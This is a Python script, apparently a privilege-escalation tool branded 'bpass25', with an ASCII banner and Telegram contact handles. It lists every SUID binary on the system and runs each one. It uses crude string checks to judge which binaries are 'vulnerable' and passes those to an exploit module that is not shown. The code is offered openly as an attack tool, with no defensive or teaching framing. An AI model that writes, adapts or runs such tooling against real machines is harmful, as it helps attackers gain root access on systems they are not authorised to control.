import subprocess
import os
import exploit
import time
from termcolor import colored

def bpass():
    text = """ 
 _                         ____  ____  
| |__  _ __   __ _ ___ ___|___ \| ___| 
| '_ \| '_ \ / _` / __/ __| __) |___ \ 
| |_) | |_) | (_| \__ \__ \/ __/ ___) |
|_.__/| .__/ \__,_|___/___/_____|____/ 
      |_|                              
    """
    print(colored(text, "blue"))
    print(colored("++ User telegram @bpass25_25", "blue"))
    print(colored("++ Telegram channel @bpass25", "blue"))
def su():
    se = ["find", "/", "-perm", "-4000", "-type", "f"]
    with subprocess.Popen(se, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True) as proc:
        _files = set() 
        for line in proc.stdout:
            path = line.strip()
            name = os.path.basename(path)
            
            if name in _files:
                continue  
            _files.add(name)
        
            time.sleep(3)
            
            com = name
            try:
                re = subprocess.run(com.split(), input="\n", capture_output=True, text=True, timeout=5)
                acti = re.stdout + re.stderr
            except Exception as e:
                acti = str(e)
            
            if ("authentication token manipulation error" in acti.lower() or
                "current password" in acti.lower() or
                "permission denied" in acti.lower()):
                print(colored(f"{name} → No Vulnerability","red"))
            elif "sudo" in  acti.lower():
                print(colored(f"{name} → No Vulnerability","red"))
            elif "su" in  acti.lower():
                print(colored(f"{name} → No Vulnerability","red"))
            else:
                time.sleep(5)
                exploit.ex_info_su(name)
bpass()
su()
